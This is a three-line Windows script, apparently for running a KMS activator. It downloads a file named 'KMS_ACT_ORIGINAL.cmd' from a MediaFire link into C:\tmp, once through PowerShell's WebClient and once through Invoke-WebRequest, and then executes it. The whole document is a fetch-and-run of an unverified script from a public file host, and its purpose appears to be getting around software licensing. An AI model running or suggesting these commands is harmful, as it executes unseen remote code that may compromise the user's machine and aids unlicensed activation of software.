# https://git.io/JkE1I

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://download939.mediafire.com/7c5y04tpf0qg/ir5prt4cw7tuk4p/KMS_ACT_ORIGINAL.cmd','C:\tmp\activation.cmd')"
Invoke-WebRequest http://download939.mediafire.com/7c5y04tpf0qg/ir5prt4cw7tuk4p/KMS_ACT_ORIGINAL.cmd -OutFile C:\tmp\activation.cmd
start C:\tmp\activation.cmd
